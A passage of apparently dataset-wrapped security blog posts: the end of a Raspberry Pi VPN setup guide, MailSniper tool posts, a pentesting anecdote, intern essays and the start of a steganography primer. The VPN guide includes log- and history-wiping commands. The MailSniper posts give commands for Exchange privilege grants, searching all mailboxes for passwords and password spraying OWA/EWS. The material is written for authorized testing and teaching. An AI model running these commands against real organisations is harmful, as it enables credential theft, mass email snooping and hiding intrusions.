the sudo raspi-config command\n\nChange User Password - Option 2\nInternalisation Options - Option 5\nChange Timezone\nChange Keyboard Layout   ### UK Keyboard by Default, see screenshots for this section, there are lots of options ###\nChange Wi-Fi Country\n\n2. To apply changes, click tab twice and reboot.\n\n3. Configure Networking and make it match the following example network/interfaces file:\n\npi:$ sudo nano /etc/network/interfaces\n\n# interfaces(5) file used by ifup(8) and ifdown(8)\n\n# Please note that this file is written to be used with dhcpcd # For static IP, consult /etc/dhcpcd.conf and 'man dhcpcd.conf'\n\n# Include files from /etc/network/interfaces.d: source-directory /etc/network/interfaces.d\n\nauto lo iface lo inet loopback\n\n### The eth0 interface will become your cloaking router\u2019s interface IP. You can set it to\n\n### whatever you want, but this must be configured prior to running the client_install.pyauto eth0allow-hotplug eth0iface eth0 inet staticaddress 192.168.50.1netmask 255.255.255.0\n\nauto wlan0 allow-hotplug wlan0 iface wlan0 inet manual wpa-conf /etc/wpa_supplicant/wpa_supplicant.conf\n\nRestart networking using sudo service networking restart\n\nUpdate OS and Raspberry Pi\n\nsudo apt-get update -y\nsudo apt-get upgrade -y\nsudo apt-get dist-upgrade -y\nsudo apt-get install rpi-update\nsudo rpi-update\nsudo reboot\n\n### After reboot, on login prompt, login.\n\n5. wget and run the goSecure Client Install Script\n\npi:~$ cd ~\npi:~$ wget https://iadgov.github.io/goSecure/files/install_scripts/gosecure_client_install.py\npi:~$ sudo python gosecure_client_install.py\n\n6. Clean up  ### remove all of your configuration tracks\n\npi:~$ sudo rm /home/pi/gosecure_client_install.py\npi:~$ sudo rm -rf /usr/share/doc/* /opt/vc/src/hello_pi/\npi:~$ sudo find /usr/share/locale/* -maxdepth 0 -type d |grep -v en |xargs sudo rm -rf\npi:~$ sudo find /usr/share/man/* -maxdepth 0 -type d |grep -Pv 'man\\d' |xargs sudo rm -rf\npi:~$ sudo find / -type f -name \"*-old\" |xargs sudo rm -rf\npi:~$ sudo rm -rf /var/backups/* /var/lib/apt/lists/* ~/.bash_history\npi:~$ sudo find /var/log/ -type f |xargs sudo rm -rf\npi:~$ sudo cp /dev/null /etc/resolv.conf\npi:~$ sudo reboot\n\nQuick and easy client use case (screenshots and such further):\n\nConnect network cable from laptop, PC or switch to the Raspberry Pi.\n\nPlug in the USB cable to the goSecure Client to the device to provide power.\n\nWait 60 seconds.\n\nOpen a web browser and navigate to \"https://setup.gosecure\"\n\nFollow the instructions on the web page that appears. The default login username is \"admin\" and the password is \"gosecure\". You will be prompted to change them once you login.\n\nThe next page will prompt you for the local wireless network. I carry a small monitor if I need to accept a terms of service page for Wi-Fi access.\n\nThe next page will prompt you for the destination VPN server; your previously acquired VPS IP address and the credentials used in the server_install.py command. Like those from earlier: user1@cloaker.dev longpasswordforuse\n\nEverything should turn green and you should confirm you are cloaked behind your VPS IP.\n\nTroubleshooting Page Unavailable:\n\nIf you cannot access the site, can you ping 192.168.50.1?\n\nDid you receive an IP address on the 192.168.50.x network?\n\nDoes a route -n command at a terminal on the Pi produce a valid default gateway or all zeroes route? 0.0.0.0 192.168.1.1 - if not, run a sudo route add default gw command in the same terminal\n\nFinally, a normal use case:\n\nPlug in the Ethernet cable from the goSecure Client to your laptop\n\nPlug in the USB cable to the goSecure Client to the device\n\nWait 60 seconds. I use the portable monitor here to accept the Wi-Fi network\u2019s terms of service on the Pi. My laptop is wired to the Pi and it becomes my router/gateway/cloaker\n\n 4. Login to the goSecure client gui at https://setup.gosecure from laptop\n\n 5. Configure your VPS IP in the VPN field, and your pre-configured username and password\n\n     6. Magical time, great success!\n\nYou are cloaked and should be buried behind your VPS\u2019 IP address when browsing the internet. Take another step, create a new local port hiding an SSH tunnel outbound and add another layer of obscurity with this:\n\nhyperion@tau-ceti:~$ ssh -D 3333 -f -C -q -N -p 8415 enoch@12.34.56.78 ### consider this server another layer of obfuscation\nhyperion@tau-ceti:~$ google-chrome --proxy-server=\"socks://localhost:3333\" ### socks proxy for the win!\n\nThanks for reading. Have fun. Be safe.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Introducing MailSniper: A Tool For Searching Every Users Email for Sensitive Data\"\nTaxonomies: \"Author, Beau Bullock, External/Internal, Red Team, Beau Bullock, hunting, Pentesting, pillaging, red teaming, sensitive info, yolo\"\nCreation Date: \"Sun, 25 Sep 2016 15:45:49 +0000\"\nBeau Bullock // \n\nTL;DR\n\nMailSniper is a penetration testing tool for searching through email in a Microsoft Exchange environment for specific terms (passwords, insider intel, network architecture information, etc.). It can be used as a non-administrative user to search their own email, or by an Exchange administrator to search the mailboxes of every user in a domain.\n\nMailSniper is available for download here: https://github.com/dafthack/MailSniper\n\nOverview\n\nOftentimes, on penetration tests we find ourselves having elevated access (Domain Admin) within an organization. Some firms stop there thinking that DA is the end goal. But it\u2019s not. \u201cGetting DA\u201d means nothing to most members of the C-suite level if you can\u2019t provide a picture of what that means in terms of risk. One of the best ways to demonstrate risk to an organization is to show the ability to gain access to sensitive data. Sensitive data to an organization varies greatly from company to company. Some common examples of sensitive data are: customer information, credit card numbers, Social Security numbers, employee information, intellectual property, industrial control systems/SCADA, health care data, etc.\n\nAccording to the 2016 Mandiant M-Trends Report (PDF) in 2015, the median number of days organizations were compromised before they detected the breach was 146. Having that much time inside of any network allows attackers to slowly and stealthily gain operational awareness, determine what the organization deems sensitive data, locate sensitive data on the network, compromise sensitive data, and ultimately exfiltrate it. How do we as pentesters go about providing that same illustration in terms of risk to an organization when we typically only have less than 5 days to complete an assessment?\n\nIn this blog post, I will detail a new tool I have developed to assist in the location of sensitive data on a network by searching through every employee's email for specific terms. The tool is called MailSniper.\n\nWhy Should We Search Email?\n\nFirst off, there are already some great tools available for locating sensitive data on a network. One of my favorite tools that I use on pretty much every engagement is called PowerView (PS1) by Will Schroeder (@harmj0y). PowerView has the ability to locate available shares on a network (Invoke-ShareFinder), and search through files (Invoke-FileFinder) on them for specific terms in the file names.\n\nSearching network shares for files containing sensitive data has proved fruitful for myself many times. But, this was not always the case. Occasionally networks I have tested were so large that scanning every network share would not complete during the testing window. Other times, maybe the attack surface was very small in terms of alive hosts, or sensitive data is simply not being stored on network shares at all. In these cases, previously I would resort to a more manual approach to locating sensitive data, which would not always result in me obtaining it.\n\nThis led me down the path to thinking about what else can we do to locate sensitive data quickly in a network. Through discussions with Derek Banks (@0xderuke) and Ethan Robish (@ethanrobish) at DerbyCon last year we came upon the idea of searching email within an organization. Email is very often the primary messaging system inside most organizations, and is the go-to medium for a simple chit chat about daily business, password resets, or even corporate strategy.\n\nHaving the power to search through email is huge when hunting for sensitive data. For example, a simple search for the term \u201c*password*\u201d in the body and subject of every email might return instructions on how to access certain systems along with what credentials to use. At an energy company a search for \u201c*scada*\u201d or \u201c*industrial control system*\u201d might return a conversation detailing the location of sensitive ICS devices. At a financial institution a search for \u201c*credit card*\u201d might reveal where employees have been sending credit card numbers in cleartext over email. At a healthcare organization searching for \u201c*SSN*\u201d or \u201c*Social Security number*\u201d could return potential health care data.\n\nHere is a real-world example where searching for the term \u201c*database*\u201d in emails revealed a conversation where a SysAdmin was telling his team where the location of their internal KeePass database was migrated to along with the key file.\n\nI copied the DB and key file to my testing system and opened it with KeePass (Of course a second factor wasn\u2019t required). All I needed was the key file that was in the same directory as the DB. ./facepalm). It was a gold mine of pretty much every credential you would ever want at an organization. All of the \u2018sa\u2019 passwords to databases, all of the network device passwords, passwords to login to their security products, Windows administrative passwords, VPN Group ID/pass, etc.\n\nMost of the environments we see are typically running Microsoft Exchange for email services. Microsoft Exchange already has a few tools for searching email built-in to the server itself. From the Exchange Management Shell on the server the Search-Mailbox cmdlet has some search functionality, but not at the level I wanted. So, I set out on building a new tool to accomplish my goal of being able to search all the mailboxes on a domain for specific terms.\n\nMailSniper.ps1\n\nAvailable here: https://github.com/dafthack/MailSniper\n\nTo accomplish my goal I decided to start building a tool called MailSniper written in PowerShell for a few reasons:\n\nPowerShell scripts are very portable\n\nSome basic scripts for connecting to Exchange Web Services already exist\n\nMicrosoft Exchange Server starting with version 2007 has implemented a web API called Exchange Web Services (EWS). EWS allows for remote web calls to the Exchange server to gather various data including calendars, contacts, and messages. The ability to connect to Exchange remotely from any system on the network provides highly flexible search capabilities.\n\nI wanted this to be a tool that could operate completely remote from any host on the network to the Exchange server, meaning an interactive session (RDP, VNC, etc.) was not required. In doing research into Exchange Web Services I discovered a few things that I found interesting that would ultimately lead to a second function being developed.\n\nMy initial goal was to create a tool to search through every mailbox in a domain for specific terms. Another highly useful function of Exchange Web Services I hadn\u2019t considered is to simply search the current user\u2019s email alone. Because of this possibility, I created a separate function inside of MailSniper.\n\nThe two main functions in MailSniper are Invoke-GlobalMailSearch and Invoke-SelfSearch.\n\nInvoke-SelfSearch\n\nInvoke-SelfSearch is a function that will simply search for terms in the current user\u2019s mailbox. The ability to search your own email in a pentesting situation may seem at first like something that wouldn\u2019t be all that useful. But when you start to consider how often we as pentesters gain access to other user\u2019s credentials during engagements and combine that then with the ability to search their email from a PowerShell script, it becomes much more powerful. It becomes a brand new privilege escalation vector.\n\nFor example, let\u2019s say that through password spraying we were able to gain access to 10 user credentials, but none of them have any administrative access. By searching through each one of their mailboxes for the terms \u201cpassword\u201d, \u201ccreds\u201d, or \u201ccredentials\u201d we might very well find a number of conversations that include information that would allow us to access other accounts or systems.\n\nTo search the current user's mailbox first open a PowerShell terminal with the \u2018-exec bypass\u2019 option to bypass execution policy. Then, import the MailSniper.ps1 module into a PowerShell terminal, and run the following Invoke-SelfSearch command with the email address of your user:\n\nInvoke-SelfSearch -Mailbox current-user@domain.com\n\nThis command will connect to the Exchange server auto-discovered from the email address entered using Exchange Web Services where, by default, 100 of the latest emails from the \"Mailbox\" will be searched through for the terms \"*pass*\",\"*creds*\",\"*credentials*\".\n\nBy default, the only option necessary for Invoke-SelfSearch is the -Mailbox option. A full list of options that can be used are:\n\nExchHostname \u2013 The hostname of the Exchange server to connect to if Autodiscover is failing.\n\nMailbox \u2013 Email address of the current user the PowerShell process is running as (i.e. the only mailbox the account can search).\n\nTerms \u2013 Certain terms to search through each email subject and body for. By default, the script looks for \u201c*password*\u201d,\u201d*creds*\u201d,\u201d*credentials*\u201d.\n\nExchangeVersion \u2013 In order to communicate with Exchange Web Services the correct version of Microsoft Exchange Server must be specified. By default, this script tries \u201cExchange2010\u201d. Additional options to try are  Exchange2007_SP1, Exchange2010, Exchange2010_SP1, Exchange2010_SP2, Exchange2013, or Exchange2013_SP1.\n\nOutputCsv \u2013 Outputs the results of the search to a CSV file.\n\nMailsPerUser \u2013 The total number of latest emails to search through in the mailbox. The default is set to the latest 100 emails in the inbox.\n\nInvoke-GlobalMailSearch\n\nInvoke-GlobalMailSearch is a function that will search through all mailboxes on an Exchange server. The process to search through every mailbox is a bit more complicated than just searching the mailbox of the current user. For starters just getting a Domain Admin account doesn\u2019t necessarily mean you now have access to everyone\u2019s mailbox. By default, the \u201cDomain Admins\u201d group does not have \u201cfull access\u201d rights to mailboxes on Exchange.\n\nThe account group that has complete and utter control of everything related to Exchange is the \u201cExchange Organization Administrators\u201d group. (FYI This group name varies between Exchange versions. In Exchange 2013 the group is called \u201cOrganization Management\u201d). In order to make this script work, you will need an account from that group. In the few tests I have run, it appears that \u201cDomain Admins\u201d has the ability to grant this access to any account. So, if typical user hunting with doesn\u2019t yield you an Exchange admin account you can always resort to adding your own user to the group with a DA. From a workstation on the domain the following command can be run as a domain admin to add a user to the \u201cExchange Organization Administrators\u201d group:\n\nC:> net groups \u201cExchange Organization Administrators\u201d /DOMAIN /ADD\n\nIn researching deeper into accessing other users\u2019 mailboxes I came across what is called the \u201cApplicationImpersonation\u201d role. The \u201cApplicationImpersonation\u201d role is a Microsoft Exchange server role that, when granted to a user, allows them to impersonate other users when accessing mailboxes. This role can be granted at the Exchange Management Shell with the following command:\n\nNew-ManagementRoleAssignment -Name:impersonationAssignmentName \n-Role:ApplicationImpersonation -User:username-of-impersonation-user\n\nHaving this role assigned to a user I controlled allowed for accessing other users\u2019 mailboxes. Exchange Management Shell was required to make this change. This is installed on the Exchange server itself. In order to perform this action remotely, Invoke-GlobalMailSearch sets up a PowerShell remoting session to the Exchange server as the Exchange admin and then imports the Microsoft.Exchange configuration which includes all of the Exchange Management Shell commands.\n\nAfter the PS-Remoting session is established Invoke-GlobalMailSearch grants a specific user passed in via the -ImpersonationAccount option the ApplicationImpersonation role. After this role has been granted the Invoke-GlobalMailSearch function creates a list of all mailboxes in the Exchange database using the Exchange Management Shell command \u2018Get-Mailbox | Select Name -ExpandProperty EmailAddresses\u2019. It is also possible to pass in a custom list of email addresses with the -MailList flag.\n\nInvoke-GlobalMailSearch then connects to Exchange Web Services using the account with the impersonation role to gather a number of emails from each mailbox and ultimately searches through them for specific terms. By default the script searches for \"*password*\",\"*creds*\",\"*credentials*\".\n\nTo search all mailboxes on an Exchange server import the MailSniper.ps1 module into a PowerShell terminal, then run the following command changing out the options to match the target environment:\n\nInvoke-GlobalMailSearch -ImpersonationAccount current-username \nExchHostname Exch01 -OutputCsv global-email-search.csv\n\nThis command will connect to the Exchange server located at 'Exch01' and prompt for administrative credentials. Once administrative credentials have been entered a PS remoting session is set up to the Exchange server where the ApplicationImpersonation role is then granted to the \"current-username\" user. A list of all email addresses in the domain is then gathered, followed by a connection to Exchange Web Services as \"current-username\" where, by default, 100 of the latest emails from each mailbox will be searched through for the terms \"*pass*\",\"*creds*\",\"*credentials*\" and output to a CSV file called global-email-search.csv.\n\nThe CSV that is output should look something like the screenshot below.\n\nAnother example of command for Invoke-GlobalMailSearch would be:\n\nInvoke-GlobalMailSearch -ImpersonationAccount current-username \nAutoDiscoverEmail user@domain.com -MailsPerUser 1000 -Terms\n\"*passwords*\",\"*super secret*\",\"*industrial control systems*\",\"*scada*\",\"*launch\ncodes*\" -ExchangeVersion Exchange2010 -OutputCsv example2search.csv \nAdminUserName domain\\adminusername -AdminPassword\nSuperSecurePassword123\n\nThis command will connect to the Exchange server auto-discovered from the email address entered, and automatically login with the administrative credentials passed on the command line. A PS-Remoting session is then setup to the Exchange server where the ApplicationImpersonation role is then granted to the \"current-username\" user. A list of all email addresses in the domain is then gathered, followed by a connection to Exchange Web Services using the Exchange Version \u2018Exchange2010\u2019 as \"current-username\" where 1,000 of the latest emails from each mailbox will be searched through for the terms \"*passwords*\",\"*super secret*\",\"*industrial control systems*\",\"*scada*\",\"*launch codes*\" and output to a CSV called example2search.csv.\n\n A full list of options that can be used with Invoke-GlobalMailSearch are:\n\nImpersonationAccount \u2013 Username of the current user account the PowerShell process is running as. This user will be granted the ApplicationImpersonation role on Exchange.\n\nExchHostname \u2013 The hostname of the Exchange server to connect to if Autodiscover is failing.\n\nAutoDiscoverEmail \u2013 A valid email address that will be used to autodiscover where the Exchange server is located.\n\nAdminUserName \u2013 The username of an Exchange administrator including the domain (i.e. domain\\adminusername).\n\nAdminPassword \u2013 The password to the Exchange administrator account specified with AdminUserName.\n\nTerms \u2013 Certain terms to search through each email subject and body for. By default, the script looks for \u201c*password*\u201d,\u201d*creds*\u201d,\u201d*credentials*\u201d.\n\nExchangeVersion \u2013 In order to communicate with Exchange Web Services the correct version of Microsoft Exchange Server must be specified. By default, this script tries \u201cExchange2010\u201d. Additional options to try are  Exchange2007_SP1, Exchange2010, Exchange2010_SP1, Exchange2010_SP2, Exchange2013, or Exchange2013_SP1.\n\nOutputCsv \u2013 Outputs the results of the search to a CSV file.\n\nMailsPerUser \u2013 The total number of latest emails to search through in the mailbox. The default is set to the latest 100 emails in the inbox.\n\nEmailList \u2013 A text file listing email addresses to search (one per line).\n\nDemo Video\n\nhttps://youtu.be/ePHbtDF6EnE\n\nConclusion\n\nHaving the ability to now search through every mailbox on a domain allows us as penetration testers to discover sensitive data on a network faster. It might also prove to be useful for escalating privileges. From a blue team perspective, it could even be used regularly to check if employees are sending sensitive information in emails that are against company policy. As of this blog post MailSniper is very much in beta form and is under development. Some future objectives for the tool are already being planned out as well.\n\nDownload MailSniper here: https://github.com/dafthack/MailSniper\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Ten years later Memories from Pentesting Past\"\nTaxonomies: \"Author, InfoSec 101, John Strand, how John got bitter, Life Lessons, Pentesting, pentesting lessons, when in doubt ask\"\nCreation Date: \"Wed, 28 Sep 2016 15:30:39 +0000\"\nJohn Strand //\n\nSo, I have passed the timeframe where I have been actively penetration testing for over a decade\u2026.\n\nI have a large number of pretty strongly held beliefs on penetration testing and I thought it would be fun to walk through how I came to those conclusions and got angry, bitter and highly protective of my ideas and private property.\n\nYes\u2026 This seems like a perfectly logical trajectory for me at this point\nOne of the things I am a bit harsh on is how many testers these days are focused on scanning and simply looking for red vulnerabilities.\nA long time ago we were testing an organization and they had a fairly clean network. They were doing regular scans and worked very hard to keep all the reds and even yellows at bay.\nAnd yes, they were smug about it\u2026 Very smug. You see, they had a number of tests over the years where teams of recent college grads would show up and simply run Nessus and leave. They had no idea how anything worked, could not get DHCP to work, and simply ran through checklists and spent all their time copying and pasting results from tools into their word template.\nThis of course never happens today. This was back in the time when security testing companies were in it for the biggest buck possible.\nNot like today.\n\n\u201cSarcasm. I know this language.\u201d -Jack\nAnyway, the target organization was pretty confident. And why wouldn't they be? 99.9% of testers knew next to nothing about pretty much anything. Not like today, where all testers are sysadmins and developers and hold multiple degrees and are fully vetted before sending a single packet in anger. Like I said, a different time.\nSo, we started breaking down services and actually connecting to them to see what we could find.\nService, by service\u2026 Banner, by banner.\nWe can across one Linux system which was running an older 2ish version of Linux. All it had was a lonely banner stating the SSH version. We resolved the name of the system back to roomwizard.company.com.\nIt was a room reservation system, running full Linux and just waiting for a password.\nWe did not know the password. So, we brute-forced the root password for a few days to no avail. This is when I learned that you can easily overload SSH with too many password attempts. We scaled it back to one guess at a time and let it run again\u2026. To no avail.\nSo, I decided to call the Room Wizard company and ask for the root password.\n\n\u201cThat's so wizard!\u201d - Phantom Menace reference achievement unlocked.\nThe very nice tech support lady spent five or six minutes looking it up. Then, she put me on hold for like an hour.\nWhen she came back she said \u201cPlease do not hack the Room Wizard\u201d.\nI responded \u201cNo, I just need to update the SSH version. It is out of date and it is messing with our DIACAP score\u201d.\nShe said \u201cNo, that is the password\u2026 All lower case.\u201d\npleasedonothacktheroomwizard\nI tried it and it worked!\nI was in!\n\n\u201cLike a G\u2026.eek.\u201d\nYou see, the lesson is that sometimes the greatest exploits and success come from weird places.\nThis is the genesis. This is where it all transitioned for me on network assessments. I cannot remember all the times I exploited MS03_026. It was a lot.\nBut this stuck. This is where I started looking at network testing as something more than simply looking at scans.\nThis is what makes our job special. It makes it fun and unique.\nIt keeps us employed.\n-John\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Many Thanks to BHIS\"\nTaxonomies: \"InfoSec 101, our interns love us, we love our interns\"\nCreation Date: \"Fri, 30 Sep 2016 15:36:09 +0000\"\nKali Regenold //\nMy time here at Black Hills Information Security has been short so far, but I believe it\u2019s been the most important four months of my computer science and security career.\n\nI started at the end of last semester, so sometime in April. At the time I thought I was way in over my head, and I guess I kind of was. I didn\u2019t know the first thing about security. I was super stressed coming in and felt like I knew nothing. I mean, if I made any wrong step the entire company could go down! I was just a freshman! But that stress really didn\u2019t last long. Everyone here made me feel welcome. And with an office of around ten people, I can confidently say everyone helped me out.\nI knew Logan previously throughout my year with the robotics lab and UAS, so he sat down with me and showed me the ropes. Even better, he answered most of the questions that I had. He said he shared my initial experience, not knowing things and not knowing how to find out. But he assured me that it\u2019s okay to not know, and it\u2019s okay to ask questions. That was when I started to relax. I knew this was going to be great.\nOkay, so relaxing didn\u2019t last too long. I was thrown into a project so big it could swallow me whole, and I had to get on top of my game. Lawrence played a key role here, in not only presenting me with challenges that I saw initially impossible, but showed me ways to solve them, in a clever and effective manner. One of the biggest takeaways from working on the project was how to write code that was clean and fast enough to work with everyone else\u2019s code. It\u2019s hard to learn how to do that kind of programming in classes, and extremely hard to actually see it in action. In one piece, my program went from taking 36 hours to run through to about 5 hours. I nearly fainted. Lawrence also taught me how to make computers work for me more than I worked for it. If I had to learn only one thing here, it\u2019s that sed and awk are crazy powerful.\nThe other interns here were also extremely welcoming. When everyone else would go home to their lives, the interns would stay behind. And after the last person left, we\u2019d gather in the \u201cintern cave\u201d and share stories as the computer tower made the room a sauna. I heard about insane hacks people made, what conventions we go to, who we\u2019ve worked with, and of course, we gossiped. But this is where I learned about how this fascinating company came to be and some of it\u2019s history in the security world. Everyone in the room loved the company, and was very happy being here. I now feel the same way.\nI\u2019m not as in over my head as I used to be, and I probably never was. I just didn\u2019t know how to deal with the problems being presented to me. I learned how to do good work for this company, and I learned how to be a better computer scientist. I\u2019ll graduate someday and know that I would never be where I am without Black Hills Information Security. In light of this, I\u2019d like to thank everyone in the Rapid City office and anywhere else in the company for their support and knowledge! This place wouldn\u2019t be the same without you."
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Attacking Exchange with MailSniper\"\nTaxonomies: \"Author, Beau Bullock, External/Internal, Red Team, Beau Bullock, FindPeople, Get-GlobalAddressList, Invoke-PasswordSprayOWA, InvokePasswordSprayEWS, MailSniper, OWA, updates\"\nCreation Date: \"Mon, 03 Oct 2016 15:41:54 +0000\"\nBeau Bullock //\n\nI\u2019ve added in a few modules to MailSniper that will assist in remote attacks against organizations that are hosting an externally facing Exchange server (OWA or EWS). Specifically, the modules are Get-GlobalAddressList, Invoke-PasswordSprayOWA, and Invoke-PasswordSprayEWS.\n\nGet-GlobalAddressList\n\nVery often on external penetration tests we perform a reconnaissance phase that might yield us some email addresses or usernames of an organization. If we can successfully find valid credentials for any one of them, and the organization has an Outlook Web Access or Exchange Web Services portal it is possible to download the entire Global Address List from the Exchange server. So, from one valid credential we can now have access to all email addresses for every employee of an organization.\n\nIn trying to improve on the method Carrie Roberts wrote about in her blog post regarding gathering the Global Address List from OWA manually I've automated this task into MailSniper.  Brian Fehrman found something very interesting in OWA. There is a function called FindPeople that will allow you to pull back the entire GAL with a single request. Unfortunately, this function is only implemented in Exchange version 2013. In testing, Get-GlobalAddressList that utilizes the FindPeople function was able to pull 4282 email addresses from a remote OWA portal in 10 seconds.\n\nThe OWA \u201cFindPeople\u201d method requires you are using PowerShell version 3 or higher.\n\nFor cases where the Exchange version is less than 2013 Get-GlobalAddressList fails back to enumerating the GAL from Exchange Web Services. This method can take a bit longer due to the fact that EWS will only let you search 100 results at a time. To get around this restriction I basically search AA through ZZ then sort/uniq the results.\n\nTo use it import the module into a PowerShell version 3 session then run something like this:\n\nGet-GlobalAddressList -ExchHostname mail.domain.com -UserName\n\ndomain\\username -Password Fall2016 -OutFile global-address-list.txt\n\nIf Exchange version is 2013 it should look something like this:\n\nAfter obtaining the full email list you can then feed that back into password spraying attacks where you will likely gain more valid credentials.\n\nSpeaking of password spraying\u2026\n\nInvoke-PasswordSprayOWA & Invoke-PasswordSprayEWS\n\nI wrote in two modules for password spraying Outlook Web Access and Exchange Web Services to MailSniper. Password spraying is an attack where instead of trying to brute force many password attempts for a single user account we try one password across many user accounts. This helps avoid account lockout and will still result in us obtaining valid credentials as users still pick passwords like \u201cFall2016\u201d. Both of the functions are multi-threaded. Just pass the -Threads option and specify a number of threads (15 seems to be a pretty good starting point).\n\nBoth functions have a similar structure but one thing to note is that Invoke-PasswordSprayOWA requires PowerShell version 3 or higher.\n\nTo use Invoke-PasswordSprayOWA import the module into a PowerShell version 3 session then run something like this:\n\nInvoke-PasswordSprayOWA -ExchHostname mail.domain.com -UserList\n\n.\\userlist.txt -Password Fall2016 -Threads 15 -OutFile owa-sprayed-creds.txt\n\nTo use Invoke-PasswordSprayEWS import the module into a PowerShell session then run something like this:\n\nInvoke-PasswordSprayEWS -ExchHostname mail.domain.com -UserList\n\n.\\userlist.txt -Password Fall2016 -Threads 15 -OutFile ews-sprayed-creds.txt\n\nYou should start to see credentials populate in the terminal as MailSniper finds valid creds:\n\nIn testing I\u2019ve noticed the EWS password spraying method is significantly faster. Both Invoke-PasswordSprayOWA and using Burp Intruder with 15 threads took about 1 hour and 45 minutes to complete spraying 10,000 users. Spraying that same list of users against EWS took only 9 minutes and 28 seconds.\n\nFor more information about MailSniper check out this blog post.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Creating the Next Generation of Interns\"\nTaxonomies: \"InfoSec 101, cyberpatriot, free swag, interns, picoCTF, teach to learn, training\"\nCreation Date: \"Wed, 05 Oct 2016 14:28:22 +0000\"\nChevy Swanson //\n\nI got my start in InfoSec through a few competitions during my time in high school. My team and I were fortunate to have a supportive school and many mentors who helped teach us what we needed to know. However, when I would look around, I would see teams posting online hoping to get a little bit of help. I think it is a shame that these students are interested in InfoSec, but lack the quality mentors that I was grateful to have. I do what I can to give back to the main competition that got me into InfoSec, CyberPatriot, by mentoring teams and offering help online.\n\nCyberpatriot, A High School infosec competition that has had great success at introducing students to infosec.\nCyberPatriot is the big player in the small field of high school security competitions and boasts membership of hundreds of teams across all 50 states. The competition gives each team a set of virtual machines with either Windows or Linux that are in a state of disrepair from a security standpoint, often compromised with malware already present. Success in this competition means removing the malware and implementing security policies that don\u2019t interfere with the workstation or server from doing its job.\nHonestly, this isn\u2019t a very hard competition but many students are completely new to the subject. Also, many teams simply lack mentors and talented people to help teach them. When I mentor teams and help students with competition training, even though the material isn\u2019t very complicated, it has proven to be one of the best ways for me to continue learning.\n\nThis must be why those SANS people are so smart, especially that John Strand guy\nThis is actually a documented phenomenon called, \u201cThe Protege Effect\u201d. By teaching, you are able to understand the topics better. By surrounding yourself with people eager to learn, you are likely to be asked quality questions that would not have been raised otherwise. People who are new to InfoSec and who are actually interested in the subject are going to be very curious, this curiosity leads to a better understanding and education to both the teacher and the students. In addition, simply knowing you will be teaching changes your mindset and makes a big impact on your ability to learn.\n \nPicoCTF, A High School level CTF that attracts hundreds of teams each time it\u2019s held\nHigh School level competitions, like CyberPatriot and PicoCTF, are doing wonders by introducing hundreds of students to InfoSec each year. With so many companies looking for interns and talented people, it is important that we support these efforts and avoid scaring people away from the field; by making their first encounter a competition they weren\u2019t prepared for. Simply put, very few interested students will continue to pursue InfoSec if they are introduced to the field by being crushed in a competition for reasons they feel like they weren\u2019t able to control, such as having less resources than some more fortunate teams. Furthermore, if too many students become disengaged, then we may see an alarmingly low pool of interns in the future. One thing we need to remember with a small pool of interns - there will be no more interns to do freeze-frame jumps behind text that says \u201cInterns\u201d.\n\nI will be working to get the BHIS interns to make our own version of this photo.\nWith the benefits to both ourselves, the students, and the future of interns in mind, I strongly urge anyone who is interested to help out a CyberPatriot team (sadly, CyberPatriot seems to be the organized InfoSec competition that makes mentoring and helping easy to do). CyberPatriot has a very organized way of assigning mentors to teams. All you have to do is go to their website and apply to be a mentor. They do a background check, then you can see a list of teams and simply click a button to indicate that you would be interested in helping a specific team. So many teams could use the help. (And, if you volunteer to help a local team, you get a free shirt which is always a good deal!)\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Steganography: The Art & Science of Hiding Things in Other Things - Part 1\"\nTaxonomies: \"How-To, binary, C2, covert communications, steganography\"\nCreation Date: \"Fri, 07 Oct 2016 16:52:45 +0000\"\nDakota Nelson* // Part 1: Image Formats\n\nWhat if I told you this adorable puppy was hiding a secret message?\n\nIn this post, we\u2019ll find out how this dog was convinced to hide a message for us\u2026 and how to learn its secrets. Along the way, we\u2019ll learn a lot about how images work and just enough math to make your high school teacher say \u201cI told you so.\u201d\nLet\u2019s start with the basics. You might already know some of this, but stick with me here.\nComputers are really just things that take bits:\n`01100010 01101100 01100001 01100011 01101011 01101000 01101001 01101100 01101100 01110011 01101001 01101110 01100110 01101111 01110011 01100101 01100011 00101110 01100011 01101111 01101101 00101111 01101100 01101100`\nAnd turn them into other bits:\n`01101010 01101111 01101000 01101110 00100000 01110010 01101111 01100011 01101011 01110011 `\nThis makes up the core of information processing in the world. Underneath cell phones, computers, the Internet, everything digital - it\u2019s all just patterns of ones and zeros.\nUnfortunately, though, not very many people can read binary, and so those bits have to be turned into something that actual humans can understand (since, for now at least, computers exist to serve humans).\nThis creates problems. Who says what patterns of bits turn into what words and pictures on a screen? Nobody, that\u2019s who. Er, also kind of everybody. Or maybe just some certain special people? Turns out, it\u2019s a huge mess. Various people and groups, at various times, for various reasons, have stuck a flag in the ground and said \u201cTHIS is how you turn a bunch of bits into an image of a cat!\u201d Whenever you see a hilarious GIF, for example, you can thank the fine folks who worked at CompuServe in 1987 and decided how GIFs should work (but not how we\u2019re supposed to pronounce GIF, for some reason). Wanna know more than you ever wanted to about GIFs? [Here\u2019s their full specification](https://www.w3.org/Graphics/GIF/spec-gif87.txt). It\u2019s alright, I\u2019ll wait.\nNow that you\u2019ve memorized the entire GIF format (you did, right? there will be a quiz later), we can move on. What does any of this have to do with hiding things? Well, we need a place to hide. Think of it as scoping out the best hide-and-seek locations in the new office.\nFor instance, in the bitmap format (what we\u2019ll be dealing with for the rest of this article; bitmap files end in `.bmp` ), each pixel contains an R, G, and B (red, green, and blue) value, each of which are one byte (eight bits). Since you can combine red, green, and blue into any color if you mix them right, this means that just those three values can allow a pixel to be any color. When you get a big list of pixels, and decide how to shape the list (i.e. are those 500 pixels a 100 x 5 pixel image, or a 50 x 10 pixel image, or\u2026) then you can display that long list of values as an image. Why will we use bitmaps here? Because they\u2019re incredibly simple.\n\nYep, simple.\nThat means that this staggeringly lame 2x2 pixel image that I made just now:\n\nIs actually this:\n    01000010 01001101 01000110 00000000 00000000 00000000  BMF...\n    00000000 00000000 00000000 00000000 00110110 00000000  ....6.\n    00000000 00000000 00101000 00000000 00000000 00000000  ..(...\n    00000010 00000000 00000000 00000000 00000010 00000000  ......\n    00000000 00000000 00000001 00000000 00011000 00000000  ......\n    00000000 00000000 